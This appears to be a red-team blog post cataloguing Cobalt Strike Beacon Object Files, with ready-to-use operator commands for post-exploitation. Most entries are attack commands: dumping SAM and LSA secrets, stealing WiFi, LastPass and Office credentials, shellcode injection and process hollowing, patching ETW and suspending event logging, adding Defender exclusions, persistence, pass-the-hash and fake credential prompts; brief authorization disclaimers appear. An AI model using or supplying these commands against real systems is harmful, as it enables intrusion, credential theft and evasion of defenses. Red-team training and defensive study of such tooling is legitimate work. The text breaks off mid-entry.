---
layout: post
title:  "Awesome Cobalt BoF(RTC0022)"
author: redteamrecipe
categories: [ tutorial ]
tags: [red, blue]
image: assets/images/890.png
description: "Awesome Cobalt BoF"
featured: true
hidden: true
rating: 4.5
---



## What is a BOF?

- **Definition**: A Beacon Object File (BOF) is a compiled C program designed to run within the Beacon process, leveraging Beacon's internal APIs.
- **Use Case**: Extends the Beacon agent with new post-exploitation features without creating new processes.

## Benefits of BOFs

- **OPSEC Friendly**: Executes within the Beacon process, no new process creation required.
- **Memory Efficient**: Uses Malleable C2 profiles within the `process-inject` block for better memory management.
- **Small Size**: BOFs are significantly smaller than equivalent Reflective DLLs, important for bandwidth-constrained operations (e.g., DNS communication).
- **Ease of Development**: Simple C code compiled with a Win32 C compiler like MinGW or Microsoft's compiler, without complex project configurations.

## How to Write a BOF

```
#include <windows.h>
#include "beacon.h"

void go(char * args, int alen) {
    BeaconPrintf(CALLBACK_OUTPUT, "Hello World: %s", args);
}
```
## Execution in Cobalt Strike

- **Beacon's Perspective**: BOF is position-independent code with access to Beacon APIs.
- **Cobalt Strike's Role**: Acts as a linker and loader, parsing the BOF and preparing it for execution.


To compile it with Visual Studio: 

```
cl.exe /c /GS-hello.c /Fohello.o 
```

To compile it with x86 MinGW: 

```
i686-w64-mingw32-gcc -c hello.c -o hello.o 
```

To compile it with x64 MinGW: 

```
x86_64-w64-mingw32-gcc -c hello.c -o hello.o 
```

The commands above create a hello.o file. Use inline-execute in Beacon to run BOF . 

```
beacon> inline-execute /path/to/hello.o args
```



### dumpwifi.c

Enumerates WiFi interfaces and dumps clear text credentials

```
load dumpwifi.cna

enumwifi

dumpwifi Wifi_Profile_Name
```

https://github.com/rvrsh3ll/BOF_Collection#dumpwific

### GetDomainInfo.c

Returns information on the current domain and domain controller.

```
inline-execute GetDomainInfo.o
```

https://github.com/rvrsh3ll/BOF_Collection#dumpwific

### GetClipboard.c

Prints any text on the clipboard.

```
inline-execute GetClipboard.o
```

https://github.com/rvrsh3ll/BOF_Collection#dumpwific

### PortScan.c

Scans a single port on a remote host.

```
load portscan.cna

bofportscan 192.168.1.10 3389
```

https://github.com/rvrsh3ll/BOF_Collection#dumpwific

#### RegistryPersistence.c

Installs or removes registry persistence.

```
inline-execute RegistryPersistence.o Install

inline-execute RegistryPersistence.o Remove
```

https://github.com/rvrsh3ll/BOF_Collection#dumpwific



### ADCS_ENUM

Enumerate Certification Authorities (CAs) and templates in Active Directory using Win32 functions.



`adcs_enum`

### ADCS_ENUM_COM

Enumerate CAs and templates in Active Directory using the `ICertConfig` COM object.



`adcs_enum_com`

### ADCS_ENUM_COM2

Enumerate CAs and templates in Active Directory using the `IX509PolicyServerListManager` COM object.



`adcs_enum_com2`

### ADV_AUDIT_POLICIES

Retrieve advanced security audit policies.



`adv_audit_policies`

### ARP

List the Address Resolution Protocol (ARP) table.



`arp`

### CACLS

List user permissions for a specified file, supports wildcards.



`cacls [filepath]`

### DIR

List files in a directory, supports wildcards and subdirectories with `/s`.

bash

`dir [directory] [/s]`

### DRIVERSIGS

Enumerate installed service ImagePaths to check the signing certificate against known AV/EDR vendors.



`driversigs`

### ENUM_FILTER_DRIVER

Enumerate filter drivers, optionally on a specified computer.



`enum_filter_driver [opt:computer]`

### ENUMLOCALSESSIONS

Enumerate currently attached user sessions both local and over RDP.



`enumLocalSessions`

### ENV

List process environment variables.

bash

`env`

### FINDLOADEDMODULE

Find what processes a module is loaded into, optionally restricting the search to a process name part.



`findLoadedModule [modulepart] [opt:procnamepart]`

### GET_PASSWORD_POLICY

Get target server or domain's configured password policy and lockouts.



`get_password_policy [hostname]`

### IPCONFIG

List IPv4 address, hostname, and DNS server.



`ipconfig`

### LDAPSEARCH

Execute LDAP searches with optional parameters for attributes, result limits, and domain controller specifics.



`ldapsearch [query] [opt: attribute] [opt: results_limit] [opt: DC hostname or IP] [opt: Distinguished Name]`

### LISTDNS

List DNS cache entries and attempt to query and resolve each.



`listdns`

### LIST_FIREWALL_RULES

List Windows firewall rules.



`list_firewall_rules`

### LISTMODS

List process modules (DLLs), target current process if no PID is provided.



`listmods [opt: pid]`

### LISTPIPES

List named pipes.



`listpipes`

### LOCALE

List system locale language, ID, date, time, and country.



`locale`

### NETGROUPLIST

List groups from the default or specified domain.



`netGroupList [opt: domain]`

### NETGROUPLISTMEMBERS

List group members from the default or specified domain.



`netGroupListMembers [groupname] [opt: domain]`

### NETLOCALGROUPLIST

List local groups from the local or specified computer.



`netLocalGroupList [opt: server]`

### NETLOCALGROUPLISTMEMBERS

List local group members from the local or specified computer.



`netLocalGroupListMembers [groupname] [opt: server]`

### NETLOGGEDON

Return users logged on the local or remote computer.



`netloggedon [hostname]`

### NETSESSION

Enumerate sessions on the local or specified computer.



`netsession [opt:computer]`

### NETSHARES

List shares on the local or remote computer.



`netshares [hostname]`

### NETSTAT

TCP and UDP IPv4 listing ports.



`netstat`

### NETTIME

Display time on a remote computer.



`nettime [hostname]`

### NETUPTIME

Return information about the boot time on the local or remote computer.



`netuptime [hostname]`

### NETUSER

Get information about a specific user, pull from a domain if a domain name is specified.



`netuser [username] [opt: domain]`

### NETUSE_ADD

Bind a new connection to a remote computer with optional parameters for credentials and persistence.



`netuse_add [sharename] [opt:username] [opt:password] [opt:/DEVICE:devicename] [opt:/PERSIST] [opt:/REQUIREPRIVACY]`

### NETUSE_DELETE

Delete the bound device or share name with options for persistence and force.



`netuse_delete [device||sharename] [opt:/PERSIST] [opt:/FORCE]`

### NETUSE_LIST

List all bound share resources or information about a target local resource.



`netuse_list [opt:target]`

### NETVIEW

List reachable computers in the current domain.



`netview`

### NSLOOKUP

Make a DNS query, with options for specifying a DNS server and record type.



`nslookup [hostname] [opt:dns server] [opt: record type]`

### PROBE

Check if a specific port is open on a host.



`probe [host] [port]`

### REG_QUERY

Query a registry value or enumerate a single key, optionally on a remote host.



`reg_query [opt:hostname] [hive] [path] [opt: value to query]`

### REG_QUERY_RECURSIVE

Recursively enumerate a key starting at the path, optionally on a remote host.



`reg_query_recursive [opt:hostname] [hive] [path]`

### RESOURCES

List memory usage and available disk space on the primary hard drive.



`resources`

### ROUTEPRINT

List IPv4 routes.



`routeprint`

### SC_ENUM

Enumerate services with details such as qc, query, qfailure, and qtriggers, optionally on a remote server.



`sc_enum [opt:server]`

### SC_QC

`sc qc` implementation in BOF for a service, optionally on a remote server.



`sc_qc [service name] [opt:server]`

### SC_QDESCRIPTION

`sc qdescription` implementation in BOF for a service, optionally on a remote server.



`sc_qdescription [service name] [opt: server]`

### SC_QFAILURE

Query a service for failure conditions, optionally on a remote server.



`sc_qfailure [service name] [opt:server]`

### SC_QTRIGGERINFO

Query a service for trigger conditions, optionally on a remote server.



`sc_qtriggerinfo [service name] [opt:server]`

### SC_QUERY

`sc query` implementation in BOF, optionally for a specific service or server.



`sc_query [opt: service name] [opt: server]`

### SCHTASKSENUM

Enumerate scheduled tasks on the local or remote computer.



`schtasksenum [opt: server]`

### SCHTASKSQUERY

Query a given task on the local or remote computer.



`schtasksquery [opt: server] [taskpath]`

### TASKLIST

List running processes including PID, PPID, and CommandLine using WMI.



`tasklist [opt: server]`

### UPTIME

List system boot time and how long it has been running.

bash

`uptime`

### VSSENUM

Enumerate Shadow Copies on some Server 2012+ servers.



`vssenum [hostname] [opt:sharename]`

### WHOAMI

List comprehensive account information.

bash

`whoami`

### WINDOWLIST

List visible windows in the current user session, with an option to list all.



`windowlist [opt:all]`

### WMI_QUERY

Run a WMI query and display results in CSV format, with options for specifying a server and namespace.



`wmi_query [query] [opt: server] [opt: namespace]`


### WMIGET

Obtain WMI information about a system.



`wmiget [query] [opt: namespace]`

### WMIQUERY

Alias to `wmi_query`, run a WMI query and display results.



`wmiquery [query] [opt: server] [opt: namespace]`

### DOMAIN_INFO

Collect various domain information from a domain-joined system.



`domain_info`

### DOMAIN_TRUSTS

Enumerate domain trusts of the current domain or a specified domain.



`domain_trusts [opt: domain]`

### DNS_CACHE_LIST

Retrieve entries from the local DNS cache.



`dns_cache_list`

### DNS_QUERY

Perform a DNS query for a specific record type.



`dns_query [hostname] [type] [opt: dns server]`

### GET_DOMAIN_SID

Retrieve the security identifier (SID) for the domain.



`get_domain_sid [opt: domain]`

### GET_FOREST_INFO

Obtain information about the current forest of a domain-joined system.



`get_forest_info`

### GET_PRIVILEGES

List privileges of the current process or a specified process.



`get_privileges [opt: pid]`

### KERBEROS_TICKETS

List Kerberos tickets for a session.



`kerberos_tickets [opt: session]`

### PROCESS_LIST

Enumerate processes similar to `tasklist`, but utilizing different methods.



`process_list`

### PROCESS_MIGRATE

Migrate to another process.



`process_migrate [pid]`

### SAM_DUMP

Dump SAM hashes from the registry.



`sam_dump`

### SEATBELT

Execute the Seatbelt command to obtain system information.

bash

`seatbelt [command]`

### SECURITY_PACKAGES_LIST

List security packages currently loaded in the system.



`security_packages_list`

### SERVICE_QUERY

Query configuration or status information about a service.



`service_query [service name] [opt: server]`

### SHARE_ENUM

List shares on the local system or a remote system.



`share_enum [opt: server]`

### SID_LOOKUP

Resolve a SID to a username or a username to a SID.



`sid_lookup [sid or username]`

### TOKEN_PRIVS

List privileges of the current token or a specified token.



`token_privs [opt: token]`

### USER_HUNTER

Identify where users are logged on in the network.



`user_hunter`

### WLAN_CREDENTIALS

Retrieve stored WLAN credentials.



`wlan_credentials`

### WLAN_PROFILE_LIST

List WLAN profiles on the system.



`wlan_profile_list`

### DNS_LISTEN

Set up DNS listener for DNS queries.



`dns_listen [port] [opt: ip]`

### HTTP_LISTEN

Set up HTTP listener for incoming HTTP requests.



`http_listen [port] [opt: ip]`

### SMB_LISTEN

Set up SMB listener for incoming SMB connections.



`smb_listen [port] [opt: ip]`

### TCP_LISTEN

Set up a generic TCP listener.



`tcp_listen [port] [opt: ip]`

### UDP_LISTEN

Set up a generic UDP listener.



`udp_listen [port] [opt: ip]`

### FILE_DOWNLOAD

Download a file from a target system.

lua

`file_download [remote path] [local path]`

### FILE_UPLOAD

Upload a file to a target system.

lua

`file_upload [local path] [remote path]`

### FILE_DELETE

Delete a file on a target system.



`file_delete [remote path]`

### FILE_COPY

Copy a file on a target system.



`file_copy [source path] [destination path]`

### FILE_MOVE

Move a file on a target system.



`file_move [source path] [destination path]`

### FILE_FIND

Find a file on a target system.



`file_find [file pattern]`


https://github.com/trustedsec/CS-Situational-Awareness-BOF


#### BOF DLL Inject

BOF DLL Inject is a custom Beacon Object File (BOF) designed for Cobalt Strike that enables manual mapping of a DLL into a target process's memory. It's particularly stealthy as it does not write the DLL to disk and avoids common detection techniques.


```
mandllinject /path/to/dll target_process_id
```

To inject `test64.dll` into a process with the PID of 9600, the command would be:

```
mandllinject /home/tom/dev/beacon-injection/test64.dll 9600
```


https://github.com/tomcarver16/BOF-DLL-Inject



#### BackupPrivSam

BackupPrivSam is a BOF (Beacon Object File) for Cobalt Strike that exploits the SeBackupPrivilege to dump the SAM, SECURITY, and SYSTEM hives from the Windows Registry of a remote machine without needing direct system access.

```
BackupPrivSAM \\computername save_path [domain] [username] [password]
```

- `\\computername`: UNC path to the target computer.
- `save_path`: Path on the target computer where the hives will be saved.
- `domain`: (Optional) Domain of the user if impersonating.
- `username`: (Optional) Username if impersonating.
- `password`: (Optional) Password for the username.


**Dump the Hives to Remote C:\ Drive Using Current Primary Token:**



```
`BackupPrivSAM \\dc01.contoso.local C:\`
```


**Dump the Hives to Remote C:\ Drive, Impersonating a User:**



```
`BackupPrivSAM \\dc01.contoso.local C:\ CONTOSO backup_service Password123`
```

**With Impersonation (SeBackupPrivilege Enabled Account):**



```
`beacon> backupPrivSAM \\cdc001.corp.contoso.local C:\ CORP backup_service *************`
```

**Without Impersonation:**



```
`beacon> make_token CORP\backup_service ********** beacon> backupPrivSAM \\cdc001.corp.contoso.local C:\`
```

**To Check the Dumped Files:**



```
`beacon> ls \\cdc001\C$`
```



#### QueueUserAPC_PPID

QueueUserAPC_PPID is a BOF that allows for process injection via APC (Asynchronous Procedure Call) queuing. It creates a new process as a child of a specified parent and injects shellcode into it.

##### Usage:

The command format for QueueUserAPC_PPID is not provided in your message, but typically the usage would be along the lines of:



```
`queueuserapc_ppid PID path_to_shellcode path_to_executable`
```


- `PID`: The Process ID of the parent process under which the new process will be spawned.
- `path_to_shellcode`: The path to the binary shellcode file to inject.
- `path_to_executable`: The path to the executable that will be spawned as the child process.

##### Example:

To inject `shellcode.bin` into a process with the PID of 1234 and spawn `notepad.exe` as a child process, the command might look like this:



```
`queueuserapc_ppid 1234 /path/to/shellcode.bin C:\Windows\System32\notepad.exe`
```

https://github.com/m57/cobaltstrike_bofs#backupprivsam



#### BOF-RegSave

BOF-RegSave is a Beacon Object File for Cobalt Strike designed to escalate privileges and dump the SAM, SYSTEM, and SECURITY registry hives for offline analysis and password hash extraction.

To use BOF-RegSave, first load the custom CNA script which will register the `bof-regsave` command within the Cobalt Strike beacon console.

**Command to Dump Registry Hives:**

```
`beacon> bof-regsave c:\temp\`
```

##### Output Files:

The dumped registry hives will be saved in the specified directory with the following filenames:

- `samantha.txt` - Contains the SAM hive.
- `systemic.txt` - Contains the SYSTEM hive.
- `security.txt` - Contains the SECURITY hive.


To execute the BOF-RegSave and output files to `c:\temp\`, use the following command:

```
beacon> bof-regsave c:\temp\
```


https://github.com/EncodeGroup/BOF-RegSave


### ETW Patching BOF

Patch or revert the `EtwEventWrite` function in `ntdll.dll` to degrade ETW logging.

**Syntax:**

- Start patching: `beacon> etw stop`
- Revert patching: `beacon> etw start`

### API Function Utility BOF

Read, check, and patch functions to detect and counteract hooking (e.g. by EPP/EDR).

**Syntax:**

- Read function: `beacon> read_function <dll_path> <function_name>`
- Check function: `beacon> check_function <dll_path> <function_name>`
- Patch function: `beacon> patch_function <dll_path> <function_name>`

### Syscalls Shellcode Injection BOF (64-bit only)

Inject shellcode using syscall stubs from the on-disk `ntdll.dll`.

**Syntax:**

- Inject beacon shellcode: `beacon> syscalls_inject <PID> <listener_name>`
- Inject custom shellcode: `beacon> syscalls_shinject <PID> <path_to_bin>`

### Spawn and Syscalls Shellcode Injection BOF (64-bit only)

Inject shellcode into a process created with `BeaconSpawnTemporaryProcess`.

**Syntax:**

- Inject beacon shellcode: `beacon> syscalls_spawn <listener>`
- Inject custom shellcode: `beacon> syscalls_shspawn <path_to_bin>`

### Spawn and Static Syscalls Shellcode Injection (NtQueueApcThread) BOF (64-bit only)

Use static syscalls to create a section, map it, queue an APC, and resume the thread.

**Syntax:**

- Inject beacon shellcode: `beacon> static_syscalls_apc_spawn <listener>`
- Inject custom shellcode: `beacon> static_syscalls_apc_spawn <path_to_bin>`

### Static Syscalls Shellcode Injection (NtCreateThreadEx) BOF (64-bit only)

Inject shellcode with static syscalls, avoiding fetched stubs from `ntdll`.

**Syntax:**

- Inject beacon shellcode: `beacon> static_syscalls_inject <PID> <listener_name>`
- Inject custom shellcode: `beacon> static_syscalls_shinject <PID> <path_to_bin>`

### Static Syscalls Process Dump BOF (64-bit only)

Dump process memory with unhooked `NtReadVirtualMemory`.

**Syntax:**

- Dump process memory: `beacon> static_syscalls_dump <PID> [path_to_output]`

### Simple Web Utility BOF (Curl)

Make simple web requests without establishing SOCKS proxy.

**Syntax:**

- Perform request: `beacon> curl host [port] [method] [--show] [useragent] [headers] [body]`

### Notes:

- Replace `<PID>` with the target process ID.
- Replace `<listener_name>` with the name of the Cobalt Strike listener.
- Replace `<path_to_bin>` with the path to the binary or shellcode file.
- Replace `<dll_path>` and `<function_name>` with the appropriate DLL path and function name for checking or patching.
- Some BOFs require a 64-bit target.
- Always ensure you are authorized to perform these actions and are compliant with laws and policies.


https://github.com/ajpc500/BOFs





### ADCS Request BOF

Requests an enrollment certificate from AD Certificate Services.

**Syntax:**

- `beacon> adcs_request`

### Add User BOF

Adds a specified user to a machine.

**Syntax:**

- `beacon> adduser [username] [password]`

### Add User to Group BOF

Adds a specified user to a group.

**Syntax:**

- `beacon> addusertogroup [username] [groupname]`

### Chrome Key BOF

Decrypts the provided base64 encoded Chrome key.

**Syntax:**

- `beacon> chromeKey [base64Key]`

### Enable User BOF

Enables and unlocks the specified user account.

**Syntax:**

- `beacon> enableuser [username]`

### Get Privilege BOF

Activates the specified token privilege.

**Syntax:**

- `beacon> get_priv [privilege_name]`

### LastPass BOF

Searches Chrome and Brave memory for LastPass passwords and data.

**Syntax:**

- `beacon> lastpass`

### Office Tokens BOF

Collects Office JWT Tokens from any Office process.

**Syntax:**

- `beacon> office_tokens`

### Process Dump BOF

Dumps the specified process to the specified output file.

**Syntax:**

- `beacon> procdump [PID] [output_file]`

### Process Destroy BOF

Closes handles in a specified process.

**Syntax:**

- `beacon> ProcessDestroy [PID]`

### Process List Handles BOF

Lists all open handles in a specified process.

**Syntax:**

- `beacon> ProcessListHandles [PID]`

### Registry Delete BOF

Deletes a registry key.

**Syntax:**

- `beacon> reg_delete [key_path]`

### Registry Save BOF

Saves a registry hive to disk.

**Syntax:**

- `beacon> reg_save [hive_name] [output_file]`

### Registry Set BOF

Sets or creates a registry key.

**Syntax:**

- `beacon> reg_set [key_path] [value_name] [type] [value]`

### Service Configuration BOF

Configures an existing service.

**Syntax:**

- `beacon> sc_config [service_name] [binPath/serviceArgs/etc.]`

### Service Creation BOF

Creates a new service.

**Syntax:**

- `beacon> sc_create [service_name] [binPath] [displayName]`

### Service Deletion BOF

Deletes an existing service.

**Syntax:**

- `beacon> sc_delete [service_name]`

### Service Description BOF

Modifies an existing service's description.

**Syntax:**

- `beacon> sc_description [service_name] [description]`

### Service Start BOF

Starts an existing service.

**Syntax:**

- `beacon> sc_start [service_name]`

### Service Stop BOF

Stops an existing service.

**Syntax:**

- `beacon> sc_stop [service_name]`

### Scheduled Tasks Creation BOF

Creates a new scheduled task with an XML definition.

**Syntax:**

- `beacon> schtaskscreate [xml_file_path]`

### Scheduled Tasks Deletion BOF

Deletes an existing scheduled task.

**Syntax:**

- `beacon> schtasksdelete [task_name]`

### Scheduled Tasks Run BOF

Starts a scheduled task.

**Syntax:**

- `beacon> schtasksrun [task_name]`

### Scheduled Tasks Stop BOF

Stops a running scheduled task.

**Syntax:**

- `beacon> schtasksstop [task_name]`

### Set User Password BOF

Sets a user's password.

**Syntax:**

- `beacon> setuserpass [username] [new_password]`

### Spawn As BOF

Attempts to inject code into a newly spawned process.

**Syntax:**

- `beacon> shspawnas [listener_name] [target_process]`

### Unexpire User BOF

Sets a user account to never expire.

**Syntax:**

- `beacon> unexpireuser [username]`

### Notes:

- Replace `[username]`, `[password]`, `[groupname]`, `[base64Key]`, `[privilege_name]`, `[PID]`, `[output_file]`, `[key_path]`, `[value_name]`, `[type]`, `[value]`, `[service_name]`, `[binPath]`, `[displayName]`, `[description]`, `[task_name]`, `[xml_file_path]`, `[new_password]`, and `[target_process]` with the appropriate parameters for the operation.
- Use quotes if any parameter includes spaces or special characters.
- Ensure proper permissions and authorizations are in place before executing these commands.
- All actions should comply with applicable laws, regulations, and policies.

https://github.com/trustedsec/CS-Remote-OPs-BOF


#### AddExclusion

Adds an exclusion to Windows Defender for a specified folder, file, process, or extension. Requires administrative privileges.

- **Arguments**:
    - `<exclusion type>`: Type of exclusion (`path`, `process`, `extension`).
    - `<exclusion data>`: Data to be excluded.
- **Usage**:
    - `addexclusion <exclusion type> <exclusion data>`
- **Examples**:
    - `addexclusion path C:\Users\Public\Downloads`
    - `addexclusion process example.exe`
    - `addexclusion extension .xll`

#### AddFirewallRule

Creates a new inbound or outbound rule in the Windows Firewall. Requires administrative privileges.

- **Arguments**:
    - `<direction>`: Rule direction (`in` for inbound, `out` for outbound).
    - `<port>`: Port number or range (e.g., `80`, `80-1000`).
    - `<rule name>`: Name of the firewall rule.
    - `<rule group>`: (Optional) Name of the rule group.
    - `<description>`: (Optional) Description of the rule.
- **Usage**:
    - `addfirewallrule <direction> <port> "<rule name>" "<rule group>" "<description>"`
- **Examples**:
    - `addfirewallrule in 80 "ExampleRuleName1" "ExampleGroup1" "Test rule"`
    - `addfirewallrule out 80-1000 "ExampleRuleName2"`

#### AddLocalCert

Imports a certificate to the local computer's certificate store. The certificate file must be on the attacker's system, not the target's.

- **Arguments**:
    - `<path to certificate file>`: Path to the certificate file on the attacker’s system.
    - `<store name>`: Store name to import to (e.g., `ROOT`).
    - `<friendly name>`: Set for the "Friendly Name" property of the certificate.
- **Usage**:
    - `addlocalcert <path to certificate.cer file> <store name> "<friendly name>"`
- **Examples**:
    - `addlocalcert C:\Users\operator\Documents\examplecert.cer ROOT "Microsoft Root Certificate Authority 2010"`

#### AddTaskScheduler

Creates a scheduled task with various trigger options, capable of local or remote deployment.

- **Basic Parameters**:
    - `taskName`: Name of the task.
    - `hostName`: Host (leave as `""` for the current system).
    - `programPath`: Path to the executable.
    - `programArguments`: (Optional) Arguments for the program.
    - `triggerType`: Type of trigger (`onetime`, `daily`, etc.).
- **Supported Trigger Options**:
    - `startTime`: Trigger start time (e.g., `2023-03-24T12:08:00`).
    - `expireTime`: (Optional) Trigger expiration time.
    - `daysInterval`: (Optional) Interval in days for the trigger.
    - `delay`: (Optional) Delay after the start time.
    - `userID`: (Optional) User for the trigger.
    - `repeatTask`: (Optional) Repeat interval.
- **Usage**:
    - `addtaskscheduler <taskName> "<hostName>" <programPath> "<programArguments>" <triggerType> <other parameters>`
- **Examples**:
    - `addtaskscheduler ExampleTask "" C:\Windows\System32\cmd.exe "" onetime 2023-03-24T12:08:00`
    - `addtaskscheduler ExampleTask "" C:\Windows\System32\cmd.exe "/c start calc.exe" daily 2023-03-24T12:08:00 2023-03-28T12:14:00 1 PT15M`
    - `addtaskscheduler ExampleTask "" C:\Users\Public\Downloads\payload.exe "" logon "DOMAIN\username"`
    - `addtaskscheduler ExampleTask "" C:\Users\Public\Downloads\payload.exe "" startup PT5M`
    - `addtaskscheduler ExampleTask "" C:\Windows\System32\cmd.exe "/c start notepad.exe" lock "" PT1H`
    - `addtaskscheduler ExampleTask "" C:\Windows\System32\cmd.exe "/c start write.exe" unlock "username" PT30M`

#### BlindEventlog

Suspends or resumes Eventlog threads, potentially disrupting event logging.

- **suspend**: Disables Eventlog functionality by suspending its threads.
- **resume**: Re-enables Eventlog functionality by resuming its threads.

bash

`blindeventlog suspend blindeventlog resume`

#### CaptureNetNTLM

Captures the NetNTLMv2 hash of the current user via simulated NTLM authentication.



`capturenetntlm`

#### CredPrompt

Presents a persistent Windows credential prompt to capture user credentials.

- **title**: Custom window title for the prompt.
- **message**: Custom message displayed in the window.
- **timer**: Auto-close timeout in seconds (default 60s).



`credprompt "Window Title" "Your Message" 30`

#### DelFirewallRule

Deletes a specified firewall rule using COM.

`- **<rule name>**:` Name of the firewall rule to delete.



`delfirewallrule "RuleName"`

#### DelLocalCert

Deletes a local computer certificate based on its thumbprint.

`- **<store name>**:` Certificate store name.
`- **<thumbprint>**:` Certificate thumbprint in uppercase.



`dellocalcert ROOT AABBCCDDEEFF00112233445566778899AABBCCDD`

#### DelTaskScheduler

Deletes a specified scheduled task on the current or a remote system.

- **taskName**: Name of the task to delete.
- **hostName**: FQDN of the remote host (optional).



`deltaskscheduler "TaskName" deltaskscheduler "TaskName" "DB01.example.local"`

#### DllEnvHijacking

Executes a DLL hijacking attack via environment variable manipulation.

`- **<new sysroot dir>**: `New SYSTEMROOT directory path.
`- **<malicious DLL name>**:` Name of the malicious DLL.
`- **<path to mal. DLL folder>**:` Folder path containing the malicious DLL.
`- **<name of vulnerable binary>**: `Executable name vulnerable to DLL hijacking.
`- **<pid parent proc>**: `Parent process ID for process spoofing.

mathematica

`dllenvhijacking C:\NewSysroot\ evil.dll C:\PathToDll\ vulnerable.exe 1234`

#### EnumLocalCert

Lists all certificates from a specified local store.

`- **<store name>**: `Name of the certificate store.



`enumlocalcert MY`

#### EnumSecProducts

Lists security products by checking running processes against a known list.

- **[hostname]**: Hostname/IP of the remote host (optional).



`enumsecproducts enumsecproducts "WS01.example.local"`

#### EnumShares

Lists remote shares and their access level from a predefined host list.

`- **<path to file>**:` Path to the file with hostnames.



`enumshares "C:\Path\To\Hostnames.txt"`

#### EnumTaskScheduler

Lists scheduled tasks in the root folder.

- **hostName**: Host FQDN (optional).



`enumtaskscheduler enumtaskscheduler "DB01.example.local"`

#### EnumWSC

Lists registered security products in Windows Security Center.

`- **<option>**:` Choose 'av', 'fw', or 'as' for antivirus, firewall, or antispyware.



`enumwsc av`

#### FindDotnet

Identifies processes likely to have .NET loaded.



`finddotnet`

#### FindExclusions

Checks for exclusions in Windows Defender.



`findexclusions`

#### FindFile

Searches for files by name, extension, or content keyword.

`- **<path to directory>**: `Directory path for search.
`- **<search pattern>**: `Word or extension to search for.
`- **<keyword>**: `Keyword for content search (optional).



`findfile "C:\Path" "*.txt" "password"`

#### FindHandle

Finds handle types between processes.

`- **all/h2p/p2h**: `Search option.
`- **<proc/thread>**: `Handle type.
`- **<pid>**: `Process ID.



`findhandle all proc`

#### FindLib

Finds or lists loaded modules in processes.

- **search/list**: Option to search for a module or list modules.
- **<module name/pid>**: Module name or process ID.

sql

`findlib search "ws2_32.dll"`

#### FindRWX

Identifies processes with RWX memory allocations.

`- **<pid>**: `Target process ID.

yaml

`findrwx 1234`

#### FindSysmon

Checks if Sysmon is active on the system.

- **<reg/driver>**: Method to check Sysmon status.



`findsysmon reg`

#### FindWebClient

Finds hosts with the WebClient service active.

- **<domain/IP>**: Specify the domain or IP to check.



`findwebclient "example.local"`

#### ForceReboot

Forces a system reboot.

`- **<delay>**: `Time in seconds before reboot (default 5s).
`- **<message>**: `Shutdown message (optional).



`forcereboot 30 "System maintenance"`

#### GetAppLocker

Retrieves AppLocker policies for executables and scripts.

- **<xml/html>**: Output format.



`getapplocker xml`

#### GetClipboard

Grabs clipboard content.



`getclipboard`

#### GetDNSCache

Retrieves the DNS cache from the system.



`getdnscache`

#### GetEnv

Gets system environment variables.

lua

`getenv`

#### GetGWX

Checks for Get Windows 10 (GWX) on the system.



`getgwx`

#### GetLSAStore

Retrieves keys and credentials from the LSA secrets store.



`getlsastore`

#### GetMSOL

Fetches information on Microsoft Office licenses.



`getmsol`

#### GetNetstat

Retrieves network connections similar to netstat.



`getnetstat`

#### GetPID

Gets the current process ID.



`getpid`

#### GetProxy

Gets the system's proxy configuration.



`getproxy`

#### GetRDP

Retrieves RDP connections and settings.

- **<session/sessioninfo>**: Type of RDP information to retrieve.



`getrdp session`

#### GetSysinfo

Retrieves system information.



`getsysinfo`

#### GetUAC

Checks the User Account Control (UAC) settings.



`getuac`

#### GetUpdate

Lists installed Windows updates.



`getupdate`

#### GetWinEvent

Retrieves Windows event logs.

`- **<event log name>**:` Name of the Windows event log.



`getwinevent "Security"`

#### GetWinFeatures

Lists Windows features and their states.



`getwinfeatures`

#### GetWinServices

Lists Windows services and their states.



`getwinservices`

#### InstallService

Installs a new service on the system.

`- **<service name>**: `Name of the new service.
`- **<display name>**: `Display name for the new service.
`- **<path to binary>**: `Full path to the service binary.
`- **<start type>**: `Service start type (auto, manual, disabled).



`installservice "NewService" "New Service Display Name" "C:\Path\To\ServiceBinary.exe" auto`

#### KillProcess

Terminates a specified process by ID or name.

- **<pid/name>**: Process ID or name.



`killprocess 1234 killprocess "notepad.exe"`

#### ListDLLs

Lists loaded DLLs for a given process.

`- **<pid>**: `Process ID.

yaml

`listdlls 1234`

#### MakeToken

Creates a new access token for impersonation.

`- **<username>**: `Username for the token.
`- **<domain>**: `Domain for the username.
`- **<password>**: `Password for the username.



`maketoken "Administrator" "DOMAIN" "Password123"`

#### MigrateProcess

Migrates a current process to a different parent.

`- **<target pid>**: `Target parent process ID.
`- **<current pid>**: `Current process ID to migrate.

yaml

`migrateprocess 1234 4321`

#### Minidump

Generates a minidump of a specified process memory.

`- **<pid>**: `Process ID.
`- **<path to dump>**: `Path where the dump file will be saved.



`minidump 1234 "C:\Path\To\DumpFile.dmp"`

#### PassTheHash

Executes a pass-the-hash attack using provided NTLM hash values.

`- **<username>**: `Username for the attack.
`- **<domain>**: `Domain for the username.
`- **<ntlm hash>**:` NTLM hash value.



`passthehash "Administrator" "DOMAIN" "aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"`

#### PatchSyscall

Patches a system call to bypass security checks.

- **<syscall number/name>**: System call identifier.



`patchsyscall NtProtectVirtualMemory`

#### PersistenceAutorun

Sets up persistence via the Autorun registry key.

`- **<path to payload>**:` Path to the executable payload.
`- **<registry key name>**:` Name for the registry key.



`persistenceautorun "C:\Path\To\Payload.exe" "PayloadKeyName"`

#### PersistenceService

Sets up persistence by creating a new service.

`- **<service name>**: `Name of the new service.
`- **<path to service binary>**:` Full path to the service binary.



`persistenceservice "PersistService" "C:\Path\To\ServiceBinary.exe"`

#### PortScan

Scans for open ports on a specified host.

`- **<ip/host>**: I`P or hostname to scan.
`- **<port range>**: `Range of ports to scan (e.g., 20-80).



`portscan "192.168.1.1" "20-80"`

#### PrintScreen

Takes a screenshot and saves it to a specified path.

`- **<path to image>**: `Path where the image file will be saved.



`printscreen "C:\Path\To\Screenshot.png"`

#### ProcessHollowing

Executes process hollowing to inject code into a legitimate process.

`- **<target executable>**:` Path to the target legitimate executable.
`- **<payload binary>**:` Path to the payload binary to inject.



`processhollowing "C:\Windows\System32\notepad.exe" "C:\Path\To\PayloadBinary.exe"`

#### QueryRegistry

Queries the registry for a specified key or value.

`- **<registry path>**:` Full path to the registry key or value.



`queryregistry "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"`

#### RemoveService

Removes a specified service.

`- **<service name>**: `Name of the service to remove.



`removeservice "UnwantedService"`

#### RunAs

Executes a program under a different user context.

`- **<username>**:` Username to run the program as.
`- **<domain>**: `Domain for the username.
`- **<password>**: `Password for the user.
